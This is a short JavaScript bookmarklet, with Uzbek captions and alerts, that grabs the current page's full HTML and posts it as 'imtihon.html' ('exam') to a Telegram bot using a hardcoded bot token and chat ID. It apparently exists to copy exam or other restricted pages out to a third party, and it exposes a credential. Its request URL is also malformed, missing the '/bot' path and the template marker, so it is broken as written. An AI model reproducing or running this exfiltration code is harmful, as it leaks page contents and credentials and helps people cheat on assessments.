javascript:(function(){
  const BOT_TOKEN = '7905303120:AAFTHbtz_lDy4M4KxurDK0xKH63y7flT6VI';
  const CHAT_ID = '5513237031'; //ID
  const html = document.documentElement.outerHTML;
  const blob = new Blob([html], { type: 'text/html' });
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('document', blob, 'imtihon.html');
  formData.append('caption', 'Sahifa nusxasi: ' + window.location.hostname);

  fetch(`https://telegram.org{BOT_TOKEN}/sendDocument`, {
    method: 'POST',
    body: formData
  }).then(r => alert('Botga yuborildi! ✅')).catch(e => alert('Xato! ❌'));
})();
